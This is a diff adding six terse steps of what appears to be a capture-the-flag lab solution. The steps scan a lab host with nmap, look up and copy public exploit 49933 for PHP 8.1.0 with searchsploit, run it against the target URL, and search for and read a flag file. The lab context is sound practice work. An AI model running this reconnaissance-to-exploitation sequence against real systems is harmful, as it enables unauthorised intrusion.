@@ -1,0 +1,6 @@
+1 - nmap -A 10.10.194.244
+2 - searchsploit "php 8.1.0"
+3 - searchsploit -m 49933
+4 - python3 49933 -> http://10.10.194.244
+5 - find / -type f -name "*flag*" 2>/dev/null
+6 - cat /flag.txt
